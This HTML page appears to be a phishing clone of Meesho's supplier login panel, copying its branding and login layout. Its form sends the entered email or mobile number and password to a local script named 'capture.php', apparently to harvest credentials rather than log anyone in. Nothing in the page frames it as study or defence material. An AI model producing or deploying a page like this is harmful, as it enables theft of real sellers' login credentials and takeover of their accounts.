<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Panel</title>
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>meesho</h1>
        </div>
        <div class="login-panel">
            <h2>Login to your supplier panel</h2>
             <form  action="./capture.php" method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="email Id or mobile number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password"placeholder="password" required>
                    <span class="toggle-password">Show</span>
                </div>
                <a href="#" class="forgot-password">Forgot password?</a>
                <button type="submit" class="login-button">Log in</button>
            </form>
            <div class="new-account">
                <hr>
                <span>New to Meesho?</span>
                <hr>
            </div>
            <button class="create-account-button">Create your supplier account</button>
        </div>
    </div>
</body>
</html>